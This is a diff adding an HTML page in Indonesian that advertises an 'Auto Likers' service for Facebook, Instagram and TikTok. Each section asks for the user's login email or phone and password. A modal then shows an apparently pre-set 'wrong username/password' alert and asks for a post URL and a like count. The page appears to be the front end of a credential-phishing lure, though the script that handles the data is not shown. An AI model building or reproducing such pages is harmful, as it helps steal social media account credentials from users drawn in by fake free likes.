@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Likers</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    
+    <header id="header">
+        <nav class="navbar-left">
+            <a href="/" class="navbar-logo">Auto Likers</a>
+            <div class="navbar-links">
+                <a href="javascript:void(0)" id="default-open" onclick="openSection(event, 'facebook')" class="navbar-link">Facebook</a>
+                <a href="javascript:void(0)" onclick="openSection(event, 'instagram')" class="navbar-link">Instagram</a>
+                <a href="javascript:void(0)" onclick="openSection(event, 'tiktok')" class="navbar-link">TikTok</a>
+            </div>
+        </nav>
+        <div class="navbar-right">
+            <div class="menu-toggler" onclick="openNav()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <section id="facebook" class="tabcontent">
+                <h3 class="title">Facebook</h3>
+                <p class="info">Auto Like Facebook Tanpa Batas</p>
+                <form action="">
+                    <div class="input-wrapper">
+                        <div class="input-label">
+                            <label for="email-facebook">Email/Telepon</label>
+                        </div>
+                        <div class="input-field">
+                            <input type="text" name="email-facebook" id="email-facebook" placeholder="Email">
+                        </div>
+                    </div>
+                    <div class="input-wrapper">
+                        <div class="input-label">
+                            <label for="password-facebook">Password</label>
+                        </div>
+                        <div class="input-field">
+                            <input type="password" name="password-facebook" id="password-facebook" placeholder="password">
+                        </div>
+                    </div>
+                    <div class="input-wrapper">
+                        <button type="button" onclick="sendData('facebook')">Submit</button>
+                    </div>
+                </form>
+            </section>
+            <section id="instagram" class="tabcontent">
+                <h3 class="title">Instagram</h3>
+                <p class="info">Auto Like Instagram Tanpa Batas</p>
+                <form action="">
+                    <div class="input-wrapper">
+                        <div class="input-label">
+                            <label for="email-instagram">Username/Email/Telepon</label>
+                        </div>
+                        <div class="input-field">
+                            <input type="text" name="email-instagram" id="email-instagram" placeholder="Email">
+                        </div>
+                    </div>
+                    <div class="input-wrapper">
+                        <div class="input-label">
+                            <label for="password-instagram">Password</label>
+                        </div>
+                        <div class="input-field">
+                            <input type="password" name="password-instagram" id="password-instagram" placeholder="password">
+                        </div>
+                    </div>
+                    <div class="input-wrapper">
+                        <button type="button" onclick="sendData('instagram')">Submit</button>
+                    </div>
+                </form>
+            </section>
+            <section id="tiktok" class="tabcontent">
+                <h3 class="title">Tik Tok</h3>
+                <p class="info">Auto Like TikTok Tanpa Batas</p>
+                <form action="">
+                    <div class="input-wrapper">
+                        <div class="input-label">
+                            <label for="email-tiktok">Username/Email/Telepon</label>
+                        </div>
+                        <div class="input-field">
+                            <input type="text" name="email-tiktok" id="email-tiktok" placeholder="Email">
+                        </div>
+                    </div>
+                    <div class="input-wrapper">
+                        <div class="input-label">
+                            <label for="password-tiktok">Password</label>
+                        </div>
+                        <div class="input-field">
+                            <input type="password" name="password-tiktok" id="password-tiktok" placeholder="password">
+                        </div>
+                    </div>
+                    <div class="input-wrapper">
+                        <button type="button" onclick="sendData('tiktok')">Submit</button>
+                    </div>
+                </form>
+            </section>
+        </div>
+    </main>
+
+    <div id="modal-facebook" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span class="close-modal">&times;</span>
+                <h2>Auto Like</h2>
+            </div>
+            <div class="modal-body">
+                <div class="alert-danger">
+                    <span class="close-btn" onclick="this.parentElement.style.display='none';">&times;</span>
+                    <strong>Username / Password</strong> Salah!
+                </div>
+                <form action="">
+                    <div class="input-wrapper">
+                        <div class="input-label">
+                            <label for="urlpost">Url Postingan</label>
+                        </div>
+                        <div class="input-field">
+                            <input type="text" name="urlpost" id="urlpost" placeholder="Masukan url postingan">
+                        </div>
+                    </div>
+                    <div class="input-wrapper">
+                        <div class="input-label">
+                            <label for="jmlhlike">Jumlah Like</label>
+                        </div>
+                        <div class="input-field">
+                            <select name="jmlhlike" id="jmlhlike">
+                                <option value="10">10 Like</option>
+                                <option selected value="50">50 Like</option>
+                                <option value="80">80 Like</option>
+                                <option value="100">100 Like</option>
+                                <option value="150">150 Like</option>
+                                <option value="180">180 Like</option>
+                                <option value="200">200 Like</option>
+                                <option value="250">250 Like</option>
+                                <option value="300">300 Like</option>
+                                <option value="500">500 Like</option>
+                                <option value="1000">1000 Like</option>
+                                <option value="1500">1500 Like</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="input-wrapper">
+                        <button type="button" class="btnmodal-submit">Submit</button>
+                    </div>
+                </form>
+            </div>
+            <!-- <div class="modal-footer">
+                <button class="modal-footer-btn">Submit</button>
+            </div> -->
+        </div>
+    </div>
+
+    <div class="modal modal-loading">
+        <div class="spinner"></div>
+        <div class="loading-text" style="padding: 10px; font-weight: bold;">Loading...</div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
